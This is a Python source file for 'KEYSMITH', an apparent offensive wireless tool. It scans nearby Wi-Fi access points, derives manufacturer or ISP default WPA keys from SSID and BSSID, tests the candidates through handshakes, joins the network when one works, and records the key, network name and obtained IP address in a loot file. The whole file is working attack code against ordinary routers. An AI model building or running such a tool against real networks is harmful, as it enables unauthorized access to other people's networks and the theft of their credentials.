#!/usr/bin/env python3
"""KEYSMITH engine.

Reads public beacon data, computes the manufacturer/ISP default WPA key for
the access point, and proves the candidate by completing a 4-way handshake.

The engine owns the radio.  ``ks/ui.py`` is a separate process that only
reads ``/tmp/keysmith_state.json`` and appends to
``/tmp/keysmith_cmd.jsonl``, so a crashed UI cannot leave the radio half
configured and a slow derivation never freezes the display.

Run:
  python3 keysmith.py run --loot /root/loot/keysmith
  python3 keysmith.py selftest
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

from ks import keygens, matcher, scan as scanmod, wpa  # noqa: E402

VERSION = "1.0.0"

DEFAULT_STATE = "/tmp/keysmith_state.json"
DEFAULT_CMD = "/tmp/keysmith_cmd.jsonl"
DEFAULT_MAX_TRIES = 40
DEFAULT_PROBE_TIMEOUT = 9.0
DEFAULT_SCAN_INTERVAL = 8.0


def _loot_dir(preferred=None):
    if preferred:
        return preferred
    if os.path.isdir("/mmc/root/loot"):
        return "/mmc/root/loot/keysmith"
    return "/root/loot/keysmith"


def _atomic_json(path, obj):
    tmp = "%s.tmp.%d" % (path, os.getpid())
    try:
        with open(tmp, "w") as fh:
            json.dump(obj, fh, separators=(",", ":"))
        os.replace(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        return False


class Engine:
    def __init__(self, args):
        self.args = args
        self.state_path = args.state
        self.cmd_path = args.cmd
        self.loot = _loot_dir(args.loot)
        self.iface = ""
        self.phase = "boot"
        self.aps: list[dict] = []
        self.target: dict | None = None
        self.plan: list[dict] = []
        self.keys: list[str] = []
        self.key_meta: list[dict] = []
        self.result: dict = {}
        self.quit = False
        self.last_scan = 0.0
        self.last_scan_ok = False
        self.derive_index = 0
        self.derive_total = 0
        self.derive_current = ""
        self.derive_progress = 0.0
        self.try_index = 0
        self.try_total = 0
        self.try_current = ""
        self.attempts: list[dict] = []
        self.events: list[dict] = []
        self.started = time.time()
        self.message = ""
        self.error = ""
        self.state = {}

    # -- plumbing ---------------------------------------------------------- #
    def log(self, level, msg):
        entry = {"t": round(time.time(), 3), "level": level, "msg": str(msg)}
        self.events.append(entry)
        self.events = self.events[-40:]
        try:
            print("[KEYSMITH] %-5s %s" % (level, msg), flush=True)
        except Exception:
            pass
        self.message = str(msg)

    def save(self):
        self.state = {
            "version": VERSION,
            "phase": self.phase,
            "iface": self.iface,
            "scan_ok": self.last_scan_ok,
            "aps": self.aps,
            "target": self.target,
            "plan": self.plan,
            "derived": len(self.keys),
            "derive_index": self.derive_index,
            "derive_total": self.derive_total,
            "derive_current": self.derive_current,
            "derive_progress": round(self.derive_progress, 4),
            "try_index": self.try_index,
            "try_total": self.try_total,
            "try_current": self.try_current,
            "key": self.result.get("key", "") if self.result else "",
            "result": self.result,
            "attempts": self.attempts[-40:],
            "message": self.message,
            "error": self.error,
            "loot": self.loot,
            "started": self.started,
            "updated": time.time(),
            "events": self.events[-20:],
        }
        _atomic_json(self.state_path, self.state)

    def set_phase(self, phase, message=None):
        self.phase = phase
        if message is not None:
            self.message = message
        self.save()

    def poll_commands(self):
        try:
            with open(self.cmd_path, "r") as fh:
                data = fh.read()
        except OSError:
            return []
        if not data.strip():
            return []
        try:
            with open(self.cmd_path, "w"):
                pass
        except OSError:
            pass
        out = []
        for line in data.splitlines():
            try:
                obj = json.loads(line)
            except ValueError:
                continue
            if isinstance(obj, dict) and obj.get("cmd"):
                out.append(obj)
        return out

    def sleep(self, seconds):
        end = time.time() + seconds
        while time.time() < end:
            for cmd in self.poll_commands():
                if cmd["cmd"] in ("stop", "shutdown"):
                    self._handle(cmd)
            time.sleep(0.12)

    # -- radio ------------------------------------------------------------- #
    def pick_radio(self):
        found = scanmod.pick_iface(self.args.iface or None)
        if not found:
            self.error = ("no tri-band radio (phy1); refusing to touch the "
                          "management uplink on phy0")
            self.log("ERROR", self.error)
            self.set_phase("error")
            return False
        self.iface = found
        ok, msg = scanmod.prep_iface(self.iface)
        if not ok:
            self.error = msg
            self.log("ERROR", msg)
            self.set_phase("error")
            return False
        self.log("INFO", "radio %s ready" % self.iface)
        return True

    def scan_once(self):
        self.last_scan = time.time()
        if not self.iface:
            if not self.pick_radio():
                return
        aps = scanmod.scan(self.iface, timeout=self.args.scan_timeout)
        if not aps:
            self.last_scan_ok = False
            self.log("WARN", "scan returned no beacons")
            self.save()
            return
        self.last_scan_ok = True
        for ap in aps:
            try:
                ap["schemes"] = len(matcher.candidates(ap["ssid"], ap["bssid"]))
            except Exception:
                ap["schemes"] = 0
        # Matched APs first, then by signal strength.
        aps.sort(key=lambda a: (a.get("schemes", 0) > 0, a.get("rssi", -100)),
                 reverse=True)
        self.aps = aps
        matched = sum(1 for a in aps if a.get("schemes"))
        self.log("INFO", "%d APs, %d with a known key scheme"
                 % (len(aps), matched))
        self.save()

    # -- planning ---------------------------------------------------------- #
    def plan_target(self, index, bssid=None):
        ap = None
        if bssid:
            for entry in self.aps:
                if entry.get("bssid", "").lower() == bssid.lower():
                    ap = entry
                    break
        if ap is None and 0 <= index < len(self.aps):
            ap = self.aps[index]
        if ap is None:
            self.log("WARN", "target index out of range")
            return
        cands = matcher.candidates(ap["ssid"], ap["bssid"])
        if not cands:
            self.log("WARN", "no default-key scheme for %s" % ap["ssid"])
            self.message = "no known scheme for this AP"
            self.save()
            return
        self.target = dict(ap)
        self.plan = []
        for cand in cands:
            self.plan.append({
                "name": cand.name,
                "note": cand.note,
                "slow": cand.name in keygens.SLOW,
                "mac": cand.mac,
            })
        self.result = {}
        self.keys = []
        self.key_meta = []
        self.attempts = []
        self.derive_index = 0
        self.derive_total = len(self.plan)
        self.derive_progress = 0.0
        self.try_index = 0
        self.try_total = 0
        names = ", ".join(p["name"] for p in self.plan)
        self.log("INFO", "%s -> %s" % (ap["ssid"], names))
        self.set_phase("plan", "ready: %s" % names)

    # -- derivation + association ----------------------------------------- #
    def _cancelled(self):
        for cmd in self.poll_commands():
            if cmd["cmd"] in ("stop", "shutdown"):
                self._handle(cmd)
                if cmd["cmd"] == "shutdown":
                    self.quit = True
                return True
        return self.quit

    def attack(self):
        if not self.target or not self.plan:
            self.log("WARN", "nothing planned")
            return
        if not self.iface:
            if not self.pick_radio():
                return
        ap = self.target
        ssid, bssid = ap.get("ssid", ""), ap.get("bssid", "")
        freq = int(ap.get("freq") or 0)
        hidden = not bool(ssid)

        # ── derive ──────────────────────────────────────────────────────── #
        self.set_phase("derive", "deriving candidates")
        self.keys = []
        self.key_meta = []
        self.derive_total = len(self.plan)
        self.derive_index = 0
        seen = set()
        start = time.time()
        for i, entry in enumerate(self.plan):
            if self._cancelled():
                self.log("WARN", "attack stopped during derivation")
                self.set_phase("plan", "stopped")
                return
            self.derive_current = entry["name"]
            self.derive_index = i
            self.derive_progress = 0.0
            self.save()
            cand = matcher.Candidate(entry["name"], entry["mac"],
                                     {"note": entry.get("note", "")})
            last_write = [0.0]

            def progress(done, total, _name=entry["name"]):
                self.derive_progress = (done / float(total)) if total else 0.0
                now = time.time()
                if now - last_write[0] > 0.4:
                    last_write[0] = now
                    self.derive_current = _name
                    self.save()

            try:
                found = matcher.candidate_keys(
                    cand, ssid, progress=progress,
                    cancelled=self._cancelled)
            except Exception as exc:
                self.log("WARN", "%s failed: %r" % (entry["name"], exc))
                found = []
            for key in found:
                if key and key not in seen:
                    seen.add(key)
                    self.keys.append(key)
                    self.key_meta.append({"key": key, "algo": entry["name"]})
            self.derive_index = i + 1
            self.derive_progress = 1.0
            self.save()
            self._write_keylist()
        self.derive_current = ""
        self.log("INFO", "%d unique keys from %d schemes in %.1fs"
                 % (len(self.keys), len(self.plan), time.time() - start))

        if not self.keys:
            self.error = "no key could be derived for this AP"
            self.set_phase("error")
            return

        # With no supplicant there is nothing to prove: show the best
        # candidate so the operator still gets the derived secret.
        if not wpa.wpa_bin():
            self.result = {
                "ok": False, "verified": False, "key": self.keys[0],
                "algo": self.key_meta[0]["algo"], "ip": "", "router": "",
                "dns": [], "reason": "wpa_supplicant not installed",
                "derived_only": True,
            }
            self.log("WARN", "wpa_supplicant missing - derived-only mode")
            self.set_phase("done", "KEY DERIVED (not verified)")
            return

        # ── try ─────────────────────────────────────────────────────────── #
        limit = max(1, int(self.args.max_tries))
        tries = self.key_meta[:limit]
        self.try_total = len(tries)
        self.try_index = 0
        self.attempts = []
        self.set_phase("try", "testing %d keys" % len(tries))
        if len(self.key_meta) > limit:
            self.log("WARN", "%d keys derived, testing the first %d"
                     % (len(self.key_meta), limit))
        try_start = time.time()
        for i, meta in enumerate(tries):
            if self._cancelled():
                self.log("WARN", "attack stopped while trying keys")
                self.set_phase("done", "stopped after %d tries" % i)
                self.result = {"ok": False, "key": "", "verified": False,
                               "reason": "stopped", "attempts": i}
                self.save()
                return
            key = meta["key"]
            self.try_index = i
            self.try_current = key
            self.save()
            probe = wpa.probe(self.iface, ssid, key, bssid, freq, hidden,
                              timeout=float(self.args.probe_timeout))
            self.attempts.append({
                "key": key, "algo": meta["algo"], "ok": bool(probe.get("ok")),
                "reason": probe.get("reason", ""),
                "elapsed": round(probe.get("elapsed", 0.0), 2),
            })
            if probe.get("ok"):
                self.log("INFO", "handshake OK: %s (%s)"
                         % (key, meta["algo"]))
                link = wpa.connect(self.iface, ssid, key, bssid, freq, hidden,
                                   assume_ok=True,
                                   driver=probe.get("driver"))
                self.result = {
                    "ok": True, "verified": True, "key": key,
                    "algo": meta["algo"], "ip": link.get("ip", ""),
                    "router": link.get("router", ""),
                    "dns": link.get("dns", []),
                    "driver": link.get("driver", ""),
                    "attempts": len(self.attempts),
                    "elapsed": round(time.time() - try_start, 1),
                }
                self.try_index = len(tries)
                self._save_loot(ap, self.result)
                self.log("INFO", "joined %s (%s)"
                         % (ssid, link.get("ip") or "no lease"))
                self.set_phase("done", "KEY FOUND - JOINED")
                return
            if probe.get("reason") in ("no wpa_supplicant",
                                       "no usable driver"):
                self.result = {
                    "ok": False, "verified": False, "key": self.keys[0],
                    "algo": self.key_meta[0]["algo"], "ip": "", "router": "",
                    "dns": [], "reason": probe.get("reason"),
                    "derived_only": True,
                }
                self.log("WARN", "association unavailable: %s"
                         % probe.get("reason"))
                self.set_phase("done", "KEY DERIVED (not verified)")
                return
            self.try_index = i + 1
            self.save()
            # Small gap so a strict AP does not treat us as a flood.
            time.sleep(0.35)

        self.result = {
            "ok": False, "verified": False, "key": "", "algo": "",
            "reason": "no key produced a handshake",
            "attempts": len(self.attempts),
            "elapsed": round(time.time() - try_start, 1),
        }
        self._save_loot(ap, self.result)
        self.log("WARN", "no key worked (%d tried)" % len(self.attempts))
        self.set_phase("done", "NO KEY MATCHED")

    # -- loot -------------------------------------------------------------- #
    def _write_keylist(self):
        if not self.target or not self.keys:
            return
        try:
            os.makedirs(self.loot, mode=0o700, exist_ok=True)
            bssid = self.target.get("bssid", "unknown").replace(":", "")
            path = os.path.join(self.loot, "keys_%s.txt" % bssid)
            with open(path, "w") as fh:
                fh.write("# KEYSMITH %s\n" % VERSION)
                fh.write("# ssid=%s bssid=%s\n"
                         % (self.target.get("ssid", ""),
                            self.target.get("bssid", "")))
                for meta in self.key_meta:
                    fh.write("%s\t%s\n" % (meta["key"], meta["algo"]))
            os.chmod(path, 0o600)
        except OSError as exc:
            self.log("WARN", "cannot write key list: %r" % exc)

    def _save_loot(self, ap, result):
        self._write_keylist()
        try:
            os.makedirs(self.loot, mode=0o700, exist_ok=True)
            path = os.path.join(self.loot, "found.txt")
            line = "%s\t%s\t%s\t%s\t%s\t%s\t%s\n" % (
                time.strftime("%Y-%m-%dT%H:%M:%S"),
                ap.get("ssid", ""), ap.get("bssid", ""),
                result.get("key", "") or "-",
                result.get("algo", "") or "-",
                result.get("ip", "") or "-",
                "ok" if result.get("ok") else (result.get("reason") or "-"))
            with open(path, "a") as fh:
                fh.write(line)
            os.chmod(path, 0o600)
        except OSError as exc:
            self.log("WARN", "cannot write loot: %r" % exc)

    # -- command handling -------------------------------------------------- #
    def _handle(self, cmd):
        name = cmd.get("cmd")
        if name == "shutdown":
            self.quit = True
            return
        if name == "stop":
            if self.phase in ("derive", "try"):
                # The attack loop notices the flag; nothing else to do here.
                pass
            elif self.phase == "plan":
                self.set_phase("scan", "stopped")
            return
        if name == "scan":
            if self.phase not in ("derive", "try"):
                self.set_phase("scan", "scanning")
            return
        if name == "plan":
            try:
                index = int(cmd.get("ap", 0))
            except (TypeError, ValueError):
                return
            self.plan_target(index, cmd.get("bssid"))
            return
        if name == "attack":
            if self.phase == "plan":
                self.attack()
            return
        if name == "disconnect":
            wpa.release(self.iface)
            self.result = {}
            self.log("INFO", "disconnected and address cleared")
            self.set_phase("scan", "disconnected")
            return

    # -- main -------------------------------------------------------------- #
    def run(self):
        try:
            os.makedirs(self.loot, mode=0o700, exist_ok=True)
        except OSError:
            pass
        self.log("INFO", "KEYSMITH %s starting" % VERSION)
        if not self.pick_radio():
            self.save()
            while not self.quit:
                for cmd in self.poll_commands():
                    if cmd["cmd"] in ("shutdown", "scan"):
                        self._handle(cmd)
                time.sleep(0.15)
            wpa.release(self.iface)
            return 1
        self.set_phase("scan", "scanning")
        try:
            while not self.quit:
                for cmd in self.poll_commands():
                    self._handle(cmd)
                    if self.quit:
                        break
                if self.quit:
                    break
                if self.phase == "scan":
                    if time.time() - self.last_scan >= self.args.scan_interval:
                        self.scan_once()
                time.sleep(0.15)
        except KeyboardInterrupt:
            self.log("INFO", "interrupted")
        finally:
            if wpa.connected(self.iface):
                wpa.release(self.iface)
            self.log("INFO", "stopped")
            self.phase = "off"
            self.save()
        return 0


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def cmd_run(args):
    engine = Engine(args)
    return engine.run()


def cmd_selftest(args):
    """Cheap on-device sanity check, no radio access."""
    problems = []
    if len(keygens.KEYGENS) < 40:
        problems.append("keygen registry incomplete (%d)" % len(keygens.KEYGENS))
    got = keygens.derive("Sitecom", "Sitecom", "00:0C:F6:01:23:45")
    if got[:1] != ["c6aBBBbg"]:
        problems.append("sitecom vector failed: %r" % (got[:1],))
    got = keygens.derive("Zyxel", "WLAN_1234", "00:1F:A4:01:23:45")
    if not got or len(got[0]) != 20:
        problems.append("zyxel produced %r" % (got,))
    cands = matcher.candidates("SitecomF12FFE", "00:0c:f6:f1:2f:fe")
    if [c.name for c in cands] != ["Sitecom", "SitecomWLR400x",
                                   "SitecomWLR2100"]:
        problems.append("matcher rules for Sitecom: %r"
                        % ([c.name for c in cands],))
    cands = matcher.candidates("Alice-53847953", "00:25:53:35:a7:91")
    keys = matcher.candidate_keys(cands[0], "Alice-53847953") if cands else []
    if keys[:1] != ["7nfyuqlahytaml3bkcjasmtf"]:
        problems.append("Alice vector failed: %r" % (keys[:1],))
    conf = wpa.conf_text("test", "secret", "00:11:22:33:44:55", 2412)
    if 'psk="secret"' not in conf or "bssid=00:11:22:33:44:55" not in conf:
        problems.append("wpa conf malformed")
    aps = scanmod.parse_scan(
        "BSS 00:0c:f6:01:23:45(on wlan1)\n"
        "\tfreq: 2412\n\tsignal: -47.00 dBm\n\tSSID: Sitecom\n"
        "\tRSN:\n\t\t* Version: 1\n")
    if len(aps) != 1 or aps[0]["enc"] != "WPA2" or aps[0]["vendor"] != "Sitecom":
        problems.append("scan parser failed: %r" % (aps,))
    print("keygens       :", len(keygens.KEYGENS))
    print("wpa_supplicant:", wpa.wpa_bin() or "MISSING")
    print("dhcp client   :", wpa.dhcp_bin() or "MISSING")
    print("iface         :", scanmod.pick_iface() or "MISSING")
    if problems:
        for p in problems:
            print("FAIL", p)
        return 1
    print("OK")
    return 0


def build_parser():
    parser = argparse.ArgumentParser(prog="keysmith.py")
    sub = parser.add_subparsers(dest="mode")

    run = sub.add_parser("run", help="run the engine")
    run.add_argument("--state", default=os.environ.get("KEYSMITH_STATE",
                                                      DEFAULT_STATE))
    run.add_argument("--cmd", default=os.environ.get("KEYSMITH_CMD",
                                                    DEFAULT_CMD))
    run.add_argument("--loot", default=os.environ.get("KEYSMITH_LOOT"))
    run.add_argument("--iface", default=os.environ.get("KEYSMITH_IFACE"))
    run.add_argument("--max-tries", type=int,
                     default=int(os.environ.get("KEYSMITH_MAX_TRIES",
                                                DEFAULT_MAX_TRIES)))
    run.add_argument("--probe-timeout", type=float,
                     default=float(os.environ.get("KEYSMITH_PROBE_TIMEOUT",
                                                  DEFAULT_PROBE_TIMEOUT)))
    run.add_argument("--scan-interval", type=float,
                     default=float(os.environ.get("KEYSMITH_SCAN_INTERVAL",
                                                  DEFAULT_SCAN_INTERVAL)))
    run.add_argument("--scan-timeout", type=float, default=25.0)

    sub.add_parser("selftest", help="offline sanity checks")
    return parser


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.mode == "selftest":
        return cmd_selftest(args)
    if args.mode != "run":
        parser.print_help()
        return 2
    return cmd_run(args)


if __name__ == "__main__":
    sys.exit(main())
